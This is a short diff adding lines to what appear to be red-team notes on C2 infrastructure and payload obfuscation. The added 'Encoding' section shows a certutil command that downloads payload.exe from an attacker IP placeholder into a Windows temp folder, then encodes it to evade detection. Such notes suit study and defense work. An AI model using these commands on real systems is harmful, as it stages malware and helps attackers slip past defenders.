@@ -42,6 +42,12 @@ Attacker -> Attack Server -- -- Target Network Security -- C2 Beacon on Target N
 ## Methods of Obsucation
 
 #### Encoding
+Certutil can both download and encode
+```shell-session
+certutil -URLcache -split -f http://Attacker_IP/payload.exe C:\Windows\Temp\payload.exe
+certutil -encode payload.exe Encoded-payload.txt
+```
+
 
 #### Archiving
 
